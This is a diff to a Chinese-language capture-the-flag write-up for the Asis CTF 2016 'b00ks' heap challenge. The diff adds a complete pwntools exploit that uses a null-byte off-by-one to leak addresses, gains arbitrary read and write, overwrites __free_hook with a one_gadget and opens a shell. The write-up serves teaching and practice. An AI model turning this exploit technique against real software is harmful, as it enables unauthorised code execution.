@@ -151,7 +151,7 @@ datastore: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically l
 
 ## 介绍
 
-Asis CTF 2016的一道题目，考察点是null byte off-by-one
+Asis CTF 2016的一道题目，[链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks)，考察点是null byte off-by-one
 
 ## 题目介绍
 
@@ -255,7 +255,7 @@ signed __int64 __fastcall my_read(_BYTE *ptr, int number)
 
 ## 利用
 
-### 1.泄漏
+### 泄漏
 
 
 因为程序中的my_read函数存在null byte off-by-one，事实上my_read读入的结束符'\x00'是写入到0x555555756060的位置的。这样当0x555555756060～0x555555756068写入book指针时就会覆盖掉结束符'\x00'，所以这里是存在一个地址泄漏的漏洞。通过打印author name就可以获得pointer array中第一项的值。
@@ -307,7 +307,7 @@ book1_addr=u64(book1_addr)
 ```
 
 
-### 2.off-by-one覆盖指针低字节
+### off-by-one覆盖指针低字节
 
 程序中同样提供了一种change功能，change功能用于修改author name，所以通过change可以写入author name，利用off-by-one覆盖pointer array第一个项的低字节。
 
@@ -334,7 +334,7 @@ def off_by_one(addr):
 其中addr+58是为了使指针指向book2的指针地址，使得我们可以任意修改这些指针值。
 
 
-### 3.通过栈实现利用
+### 通过栈实现利用
 
 通过前面2部分我们已经获得了任意地址读写的能力，读者读到这里可能会觉得下面的操作是显而易见的，比如写got表劫持流程或者写__malloc_hook劫持流程等。但是这个题目特殊之处在于开启PIE并且没有泄漏libc基地址的方法，因此我们还需要想一下其他的办法。
 
@@ -383,3 +383,97 @@ Start              End                Offset             Perm Path
 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
 ```
 
+### EXP
+```python
+from pwn import *
+context.log_level="info"
+
+binary=ELF("b00ks")
+libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+io=process("./b00ks")
+
+
+def createbook(name_size,name,des_size,des):
+	io.readuntil("> ")
+	io.sendline("1")
+	io.readuntil(": ")
+	io.sendline(str(name_size))
+	io.readuntil(": ")
+	io.sendline(name)
+	io.readuntil(": ")
+	io.sendline(str(des_size))
+	io.readuntil(": ")
+	io.sendline(des)
+
+def printbook(id):
+	io.readuntil("> ")
+	io.sendline("4")
+	io.readuntil(": ")
+	for i in range(id):
+		book_id=int(io.readline()[:-1])
+		io.readuntil(": ")
+		book_name=io.readline()[:-1]
+		io.readuntil(": ")
+		book_des=io.readline()[:-1]
+		io.readuntil(": ")
+		book_author=io.readline()[:-1]
+	return book_id,book_name,book_des,book_author
+
+def createname(name):
+	io.readuntil("name: ")
+	io.sendline(name)
+
+def changename(name):
+	io.readuntil("> ")
+	io.sendline("5")
+	io.readuntil(": ")
+	io.sendline(name)
+
+def editbook(book_id,new_des):
+	io.readuntil("> ")
+	io.sendline("3")
+	io.readuntil(": ")
+	io.writeline(str(book_id))
+	io.readuntil(": ")
+	io.sendline(new_des)
+
+def deletebook(book_id):
+	io.readuntil("> ")
+	io.sendline("2")
+	io.readuntil(": ")
+	io.sendline(str(book_id))
+
+createname("A"*32)
+createbook(128,"a",32,"a")
+createbook(0x21000,"a",0x21000,"b")
+
+
+book_id_1,book_name,book_des,book_author=printbook(1)
+book1_addr=u64(book_author[32:32+6].ljust(8,'\x00'))
+log.success("book1_address:"+hex(book1_addr))
+
+payload=p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)
+editbook(book_id_1,payload)
+changename("A"*32)
+book_id_1,book_name,book_des,book_author=printbook(1)
+book2_name_addr=u64(book_name.ljust(8,"\x00"))
+book2_des_addr=u64(book_des.ljust(8,"\x00"))
+log.success("book2 name addr:"+hex(book2_name_addr))
+log.success("book2 des addr:"+hex(book2_des_addr))
+libc_base=book2_des_addr-0x5b9010
+log.success("libc base:"+hex(libc_base))
+
+free_hook=libc_base+libc.symbols["__free_hook"]
+one_gadget=libc_base+0x4f322 #0x4f2c5 0x10a38c 0x4f322
+log.success("free_hook:"+hex(free_hook))
+log.success("one_gadget:"+hex(one_gadget))
+editbook(1,p64(free_hook)*2)
+editbook(2,p64(one_gadget))
+#gdb.attach(io)
+
+
+deletebook(2)
+
+
+io.interactive()
+```
